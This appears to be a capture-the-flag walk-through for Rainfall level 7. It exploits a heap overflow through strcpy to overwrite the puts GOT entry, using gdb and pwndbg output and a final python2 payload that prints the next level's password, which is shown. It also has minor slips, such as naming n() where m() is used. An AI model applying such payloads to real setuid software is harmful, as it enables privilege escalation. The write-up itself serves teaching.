# Walk-through Level7

## Introduction
Level7 is part of the Rainfall challenge series, where the goal is to escalate privileges by exploiting a vulnerable binary. This walk-through covers analyzing the binary, identifying vulnerabilities, and obtaining elevated access.

## Binary Information
The binary is a 32-bit ELF executable for the Intel 80386 architecture. It is dynamically linked and not stripped, making it easier to analyze. The following command confirms its properties:
```bash
level7@RainFall:~$ file level7
level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped
```

## Security Checks
Examining the binary's security mechanisms reveals that it lacks several modern protections, making it more susceptible to exploitation:

```bash
level7@RainFall:~$ checksec --file level7
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level7
```

**Key observations:**
> **No RELRO** : The binary does not protect against GOT overwrite attacks.

> **No stack canary** : Buffer overflow attacks are possible.

> **NX disabled** : Stack is executable, allowing shellcode execution.

> **No PIE** : The binary has a fixed memory layout, making exploitation easier.

## Source Code Analysis
The program allocates two memory regions: one for a string and another for a function pointer. It uses strcpy() without bounds checking, leading to a buffer overflow that allows overwriting the function pointer. By replacing it with the address of m(), the attacker can execute a command to read the password file.
Key Points:

* Memory Allocation: Multiple calls to malloc(8) allocate memory for buffers and function pointers.
* Buffer Overflow: strcpy() copies user input into buffers without bounds checking, allowing the overflow to overwrite the function pointer.
* Overwriting Function Pointer: By overflowing the buffer, the attacker can redirect execution to m(), which prints the password.

```c
int main()
{
   struct_0 *v0;  // [sp-0xc]
   struct_0 *v1;  // [sp-0x8]
   char v3;  // [bp+0x8]
   unsigned int v4[2];  // eax
   unsigned int v5;  // eax
   unsigned int v6[2];  // eax
   unsigned int v7;  // eax
   FILE_t *v8;  // eax

   v4 = malloc(8);
   v1 = &v4[0];
   v1->field_0 = 1;
   v5 = malloc(8);
   v1->field_4 = v5;
   v6 = malloc(8);
   v0 = &v6[0];
   v0->field_0 = 2;
   v7 = malloc(8);
   v0->field_4 = v7;
   strcpy(v1->field_4, *((int *)(*((int *)&v3) + 4)));
   strcpy(v0->field_4, *((int *)(*((int *)&v3) + 8)));
   v8 = fopen("/home/user/level8/.pass", "r");
   fgets(&c, 68, v8);
   puts("~~");
   return 0;
}

// target function cuz of the c hold the buffer in the main after reading the password
int m()
{
    unsigned int v0;  // [sp-0x18]
    unsigned int v1;  // [sp-0x14]

    v1 = time(NULL);
    v0 = &c;
    return printf("%s - %d\n");
}
```


### Finding the Overflow Offset
Using a cyclic pattern:
```
┌──(kali㉿kali)-[~/42-Rainfall/level7]
└─$ cyclic 100          
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
                                                                                                                     
```
Let's execute it.
```
(gdb) r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa


Program received signal SIGSEGV, Segmentation fault.
0xb7eb8b59 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) info registers 
eax            0x61616166       1633771878
ecx            0xbffff8a4       -1073743708
edx            0x61616166       1633771878
ebx            0xbffff8b0       -1073743696
esp            0xbffff634       0xbffff634
ebp            0xbffff668       0xbffff668
esi            0x0      0
edi            0x61616166       1633771878
eip            0xb7eb8b59       0xb7eb8b59
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

```
The offset is 20.
```
                                                                                                                     
┌──(kali㉿kali)-[~/42-Rainfall/level7]
└─$ cyclic -l 0x61616166
20
```

Why Check EAX After Using a Cyclic Pattern?

When using a cyclic pattern to find an overflow offset, we usually check registers like EIP (in 32-bit) or RIP (in 64-bit) to see where execution control was hijacked. However, in some cases, other registers get corrupted first, leading to a crash before reaching EIP/RIP.

In our case, the program crashes inside strcpy, and you used cyclic to find the offset. Instead of EIP, the crash happens because EAX holds a corrupted pointer containing cyclic pattern data (0x61616166 → "faaa").

## Exploitation Strategy

From **Finding the Overflow Offset**, we got the idea that we can retrieve the address of a function call (in our case, `printf`). **Note:** Some compilers optimize `printf` without arguments by replacing it with `puts`, so we will override the **GOT entry of `puts`** instead.  

Since the second argument gets placed in the first argument's location, and we **control the first argument after the overflow**, we can modify its address. This allows us to hijack execution and redirect it as needed, as we saw when calculating the overflow offset.  

#### **Final Payload Structure:**  
```  
arg1 = 'A' * 20 + [address of puts@GOT]  
arg2 = [target address]  
```
This will overwrite the GOT entry of `puts`, redirecting execution to our desired address.  

Goal:
We aim to overwrite the puts entry in the GOT with a target address, redirecting execution to m() (which prints the password).
Steps:
   1. Overflow the buffer to overwrite the puts GOT entry.
   2. Send the target address (the address of m()) as the second argument, so that it is copied into the destination (overwriting puts GOT entry).
   3. Redirect execution to m() by controlling the GOT entry, which will now point to m() instead of puts(), allowing us to print the password.

### Finding the Target Function Address

```bash
level7@RainFall:~$ objdump -D level7  | grep -w m
080484f4 <m>:
```

Here's how to get the address of puts from the GOT:

```
(gdb) disassemble 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
   0x80483a0
```


### Diving Deep into Heap Memory to Understand What Happens  

We'll set some breakpoints to see what happens.

```
┌──(kali㉿kali)-[~/42-Rainfall/level7]
└─$ gdb-pwndbg ./level7                                            
Reading symbols from ./level7...
(No debugging symbols found in ./level7)
Dump of assembler code for function main:
   0x08048521 <+0>:     push   ebp
   0x08048522 <+1>:     mov    ebp,esp
   0x08048524 <+3>:     and    esp,0xfffffff0
   0x08048527 <+6>:     sub    esp,0x20
   0x0804852a <+9>:     mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:    mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:    mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:    mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    edx,eax
   0x08048552 <+49>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:    mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:    mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:    mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:    mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:    mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    edx,eax
   0x08048581 <+96>:    mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:   mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:   mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:   add    eax,0x4
   0x0804858e <+109>:   mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:   mov    edx,eax
   0x08048592 <+113>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:   mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:   mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:   mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:   add    eax,0x8
   0x080485ab <+138>:   mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:   mov    edx,eax
   0x080485af <+142>:   mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:   mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:   mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:   mov    DWORD PTR [esp],eax
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    edx,0x80486e9
   0x080485c7 <+166>:   mov    eax,0x80486eb
   0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:   mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    eax,0x0
   0x08048601 <+224>:   leave
   0x08048602 <+225>:   ret

End of assembler dump.
pwndbg> b *0x0804857f
pwndbg> b *0x0804859d
Breakpoint 1 at 0x0804857f 
Breakpoint 2 at 0x0804859d
```

We hit our first breakpoint. Using the vis command, we can observe the heap. The structure from the source code gets allocated, with each struct member receiving 8 bytes. We see the addresses of v1.name and v2.name, and notice that v1.number is set to 1, while v2.number is set to 2.

```
pwndbg> c
Continuing.

Breakpoint 1, 0x0804857f in main ()
pwndbg> vis
0x804a198       0x00000000      0x00000011      ........
0x804a1a0       0x00000001      0x0804a1b0      ........
0x804a1a8       0x00000000      0x00000011      ........
0x804a1b0       0x00000000      0x00000000      ........
0x804a1b8       0x00000000      0x00000011      ........
0x804a1c0       0x00000002      0x0804a1d0      ........
0x804a1c8       0x00000000      0x00000011      ........
0x804a1d0       0x00000000      0x00000000      ........
0x804a1d8       0x00000000      0x00021e29      ....)...         <-- Top chunk

```
After the overflow occurs, we know that v2.name will be replaced with the address we provide in arg1. Since arg2 places its value at the address of v2.name, we confirm in the heap using vi that the memory has been modified as expected
```
pwndbg> c
Continuing.

Breakpoint 2, 0x0804859d in main ()
pwndbg> vis
0x804a198       0x00000000      0x00000011      ........  
0x804a1a0       0x00000001      0x0804a1b0      ........    
0x804a1a8       0x00000000      0x00000011      ........  
0x804a1b0       0x41414141      0x41414141      AAAAAAAA  
0x804a1b8       0x41414141      0x41414141      AAAAAAAA  
0x804a1c0       0x41414141      0x08049928      AAAA(...   
0x804a1c8       0x00000000      0x00000011      ........
0x804a1d0       0x00000000      0x00000000      ........
0x804a1d8       0x00000000      0x00021e29      ....)...         <-- Top chunk  
```

## Gaining Access
Exploit the vulnerability by crafting input to overwrite the function pointer with `n()`'s address:
```bash
level7@RainFall:~$ ./level7 `python2 -c "print 'A' * 20 + '\x28\x99\x04\x08'"` `python2 -c  'print "\xf4\x84\x04\x08"'`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1738873327

```

## Mitigation Strategies
To secure this binary, the following steps should be taken:
1. **Bounds checking**: Replace `strcpy()` with `strncpy()` to prevent buffer overflows.
2. **Enable stack canaries**: Protect function return addresses from being overwritten.
3. **Use DEP (NX enabled)**: Prevent execution of injected shellcode.
4. **Remove SUID/SGID bits**: Reduce privilege escalation risks.

## Conclusion
This level demonstrates a classic buffer overflow attack exploiting function pointer overwrites. The key takeaway is that improper memory management can lead to severe security vulnerabilities. Proper validation, secure coding practices, and modern security mechanisms should always be used to mitigate such risks.

